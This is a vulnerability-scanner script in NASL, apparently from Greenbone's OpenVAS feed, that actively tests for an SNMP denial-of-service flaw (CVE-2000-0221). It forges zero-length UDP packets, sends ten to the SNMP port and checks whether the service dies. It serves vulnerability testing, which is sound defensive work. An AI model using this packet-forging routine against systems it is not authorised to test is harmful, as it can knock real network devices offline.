# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.147135");
  script_version("2021-11-11T14:05:03+0000");
  script_tag(name:"last_modification", value:"2021-11-12 11:32:18 +0000 (Fri, 12 Nov 2021)");
  script_tag(name:"creation_date", value:"2021-11-11 06:49:40 +0000 (Thu, 11 Nov 2021)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_cve_id("CVE-2000-0221");

  script_tag(name:"qod_type", value:"remote_probe");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("SNMP DoS Vulnerability (CVE-2000-0221) - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("snmp_detect.nasl", "global_settings.nasl");
  script_mandatory_keys("SNMP/detected");
  script_require_udp_ports("Services/udp/snmp", 161);
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_tag(name:"summary", value:"Some SNMP implementations are prone to a denial of service (DoS)
  vulnerability when receiving UDP packets with zero length.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted UDP packets and checks if the service
  is still reachable afterwards.

  Note: For a successful detection the remote SNMP service either needs to accept a default 'public'
  SNMPv1 / SNMPv2c community or a valid one needs to be given in the credentials configuration of
  the scanning task.");

  script_tag(name:"solution", value:"Contact your vendor for updates.");

  exit(0);
}

include("snmp_func.inc");

if (TARGET_IS_IPV6())
  exit(0);

port = snmp_get_port(default: 161);

own_ip = this_host();
target_ip = get_host_ip();
sport = (rand() % 64511) + 1024;

if (!snmp_get(port: port, oid: "1.3.6.1.2.1.1.1.0"))
  exit(0);

ip = forge_ip_packet(ip_v:   4,
                     ip_hl:  5,
                     ip_tos: 0,
                     ip_id:  0x1234,
                     ip_len: 28,
                     ip_off: 0,
                     ip_p:   IPPROTO_UDP,
                     ip_src: own_ip,
                     ip_ttl: 255);

udp_zero = forge_udp_packet(ip: ip, uh_dport: port, uh_sport: sport, uh_ulen: 8);

for (i = 0; i < 10; i++)
  send_packet(udp_zero, pcap_active: FALSE);

sleep(5);

if (!snmp_get(port: port, oid: "1.3.6.1.2.1.1.1.0")) {
  report = "The SNMP service is not responding anymore after sending multiple UDP packets with zero length.";
  security_message(port: port, data: report, proto: "udp");
  exit(0);
}

exit(99);